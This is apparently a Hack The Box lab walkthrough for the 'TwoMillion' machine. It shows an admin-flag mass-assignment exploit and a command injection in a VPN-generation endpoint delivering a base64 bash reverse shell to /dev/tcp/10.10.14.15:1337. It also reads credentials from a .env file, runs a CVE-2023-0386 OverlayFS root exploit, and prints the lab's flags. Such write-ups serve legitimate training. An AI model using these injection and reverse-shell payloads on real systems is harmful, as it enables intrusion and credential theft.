
# #HTB 


![[Pasted image 20260104135744.png|281]]

# HTB: TwoMillion

**Machine IP:** `10.10.11.221`  
**Difficulty:** Easy 
**OS:** Linux 

---

## Tools Used
- `rustscan` / `nmap` - Port discovery
- `de4js` - JavaScript deobfuscation
- `curl` - API interaction
- `jq` - JSON parsing
- `base64` / `rot13` - Encoding/decoding
- `nc` - Reverse shell listener
- `ssh` - Remote access
- `scp` - File transfer
- `gcc` / `make` - Exploit compilation

---

## Step 1: Reconnaissance - Port Scanning

### RustScan Results

```
rustscan -a 10.10.11.221
```

**Open ports discovered:**
- Port 22 (SSH)
- Port 80 (HTTP)

![[Pasted image 20260104135824.png]]






## Step 2: Web Enumeration - Invite Code System

### Invite Page

Visiting `http://2million.htb/invite` reveals a page requiring an invite code to sign up.

![[Pasted image 20260104135907.png]]


### JavaScript Analysis

The page loads `inviteapi.min.js` which contains obfuscated JavaScript.

![[Pasted image 20260104140217.png]]


### Deobfuscating the Code

Using `de4js` to deobfuscate reveals two functions:
```
function verifyInviteCode(code) {
    var formData = { "code": code };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) { console.log(response); },
        error: function(response) { console.log(response); }
    });
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) { console.log(response); }
    });
}
```

![[Pasted image 20260104140301.png]]

![[Pasted image 20260104140406.png]]






## Step 3: Invite Code Generation

### Get Generation Instructions

```
curl -sX POST http://2million.htb/api/v1/invite/how/to/generate
```

**Response:**
```
{
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhfrg gb /ncvi/i1/vaivgr/traerengr",
    "status": 200
}
```
- The text is ROT13 encrypted.

![[Pasted image 20260104143007.png]]


### Decrypting the Hint

ROT13 decryption reveals:
- In order to generate the invite code, make a POST request to /api/v1/invite/generate

![[Pasted image 20260104143030.png]]


### Generate Invite Code

```
curl -sX POST http://2million.htb/api/v1/invite/generate
```

![[Pasted image 20260104143233.png]]


### Base64 Decode

Decoding the Base64 string:
-  `TVhYUVEtUE5YNVAtMUpETVAtWjJHQjQ=  →  MXXQQ-PNX5P-1JDMP-Z2GB4

![[Pasted image 20260104143353.png]]


![[Pasted image 20260104143457.png]]



### Registration

Using the invite code to register a new user:

**Credentials:**
- Username: `thunder`
- Email: `thunder@haha.com`
- Password: (user-defined)

![[Pasted image 20260104143541.png]]






## Step 4: API Enumeration

### Login

![[Pasted image 20260104143617.png]]


![[Pasted image 20260104145535.png]]


### API Endpoints Discovery

```
curl http://2million.htb/api/v1 --cookie "PHPSESSID=033oshnki7fmtdmtqevljr8bad" | jq
```

![[Pasted image 20260104145433.png]]


## Step 5: Privilege Escalation to Admin

### Check Admin Status

```
curl http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=033oshnki7fmtdmtqevljr8bad"
```

We get a list of quite a few endpoints that are available in the API, with some of the most interesting ones being the admin specific endpoints. As a test we can hit the /admin/auth endpoint to check if we are an admin user.

![[Pasted image 20260104150855.png]]


### Admin Endpoint Testing

Attempting to access admin endpoints returns 401 Unauthorized:

![[Pasted image 20260104151036.png]]


### Discovering the Vulnerability

The `/api/v1/admin/settings/update` endpoint accepts a PUT request:

```
curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=033oshnki7fmtdmtqevljr8bad"
```

We get a 401 Unauthorised error, most probably because we are not an admin. Let's move to the final administrative endpoint, /admin/settings/update . We note that this request needs to be a PUT as shown in the output from /api/v1 .

![[Pasted image 20260104151242.png]]
Interestingly enough, this time we do not get an Unauthorized error, but instead the API replies with Invalid content type


### Admin Privilege Escalation

Setting the `is_admin` parameter via JSON payload:
```
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  --cookie "PHPSESSID=0330shnki7fmtdmtqev1jr8bad" \
  --header "Content-Type: application/json" \
  --data '{"email":"thunder@haha.com","is_admin":1}' | jq
```

![[Pasted image 20260104152712.png]]


### Verify Admin Access

```
curl http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=0330shnki7fmtdmtqevljr8bad" | jq
```

![[Pasted image 20260104152728.png]]







## Step 6: Command Injection & Reverse Shell

### Command Injection via VPN Generation

The `/api/v1/admin/vpn/generate` endpoint is vulnerable to command injection:
```
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.15/1337 0>&1"' | base64
```

![[Pasted image 20260104155318.png]]

```
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  --cookie "PHPSESSID=0330shnki7fmtdmtqev1jr8bad" \
  --header "Content-Type: application/json" \
  --data '{"username":"test;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNS8xMzM3IDA+JjEiCg== | base64 -d | bash;"}'
```

![[Pasted image 20260104155408.png]]


### Netcat Listener

```
nc -lvnp 1337
```

**Shell received:**
![[Pasted image 20260104155424.png]]






## Step 7: Database Credentials

### Environment File Discovery

```
cat .env
```

![[Pasted image 20260104155527.png]]
**Credentials:**
```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```






## Step 8: SSH Access as Admin

### SSH Login

```
ssh admin@2million.htb
```
![[Pasted image 20260104155631.png]]


### User Flag

```
admin@2million:~$ cat user.txt
80d188703056b64b307127a9b1134804
```

![[Pasted image 20260104160301.png]]






## Step 9: Privilege Escalation to Root

### Email Analysis

```
admin@2million:/var/mail$ cat admin
```

![[Pasted image 20260508120143.png]]



### CVE-2023-0386 - OverlayFS Privilege Escalation

The email references an OverlayFS vulnerability. This is **CVE-2023-0386**.

![[Pasted image 20260104161607.png]]


### Exploit Preparation

Transfer the exploit to the target:
```
scp cve.zip admin@2million.htb:/tmp
```

![[Pasted image 20260104161619.png]]

### Compile and Run Exploit

```
admin@2million:/tmp$ unzip cve.zip
admin@2million:/tmp$ cd CVE-2023-0386/
admin@2million:/tmp/CVE-2023-0386$ make all
```
![[Pasted image 20260104161808.png]]

### Execute Exploit

```
admin@2million:/tmp/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc &
admin@2million:/tmp/CVE-2023-0386$ ./exp
```

![[Pasted image 20260104162047.png]]

![[Pasted image 20260104162024.png]]

### Root Flag

```
8ff9ec14838da6e4c6bda86c52a79b96
```

![[Pasted image 20260104162236.png]]




## Step 10: Machine Owned

![[Pasted image 20260104162246.png]]


---


## Flags

|Flag|Value|
|---|---|
|User|`80d188703056b64b307127a9b1134804`|
|Root|`8ff9ec14838da6e4c6bda86c52a79b96`|

---

## Credentials Table

|User|Password|Source|
|---|---|---|
|thunder|(user-defined)|Registration|
|admin|SuperDuperPass123|.env file|
|root|(via CVE-2023-0386)|N/A|

---
